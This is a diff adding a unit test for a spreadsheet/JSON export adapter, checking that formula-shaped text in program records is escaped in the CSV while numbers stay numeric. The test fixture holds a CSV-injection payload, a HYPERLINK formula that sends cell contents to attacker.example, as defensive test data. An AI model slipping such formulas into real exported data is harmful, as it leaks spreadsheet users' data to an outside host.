@@ -166,4 +166,30 @@ describe('Goal Organization Export contributor', () => {
       ).contribute({ organizationId: 'org-goal-export', requestId: 'a', asOf: AS_OF }),
     ).rejects.toThrow(/snapshot window is unavailable/)
   })
+
+  it('opens formula-shaped Program text as text and keeps numeric targets numbers', async () => {
+    const hostile = {
+      name: '=HYPERLINK("https://attacker.example/leak?d="&A2,"Open")',
+      description: '@SUM(A1:A9)',
+      status_reason: '-2+3',
+    }
+    const contribution = await createGoalOrganizationExportAdapter(
+      fakeDatabase({ ...FIXTURE, goal_programs: [{ ...PROGRAM_ROW, ...hostile }] }),
+    ).contribute({ organizationId: 'org-goal-export', requestId: 'a', asOf: AS_OF })
+    const text = (path: string) =>
+      Buffer.from(
+        contribution.entries.find((entry) => entry.path === path)!.bytes,
+      ).toString('utf8')
+
+    const csv = text('goal/programs.csv')
+    expect(csv).toContain(
+      '"\'=HYPERLINK(""https://attacker.example/leak?d=""&A2,""Open"")"',
+    )
+    expect(csv).toContain(",'@SUM(A1:A9),active,'-2+3,")
+    expect(csv).toContain(',4.5,UTC,')
+    const json = JSON.parse(text('goal/programs.json')) as {
+      records: { goal_program: readonly Record<string, unknown>[] }
+    }
+    expect(json.records.goal_program[0]).toMatchObject(hostile)
+  })
 })
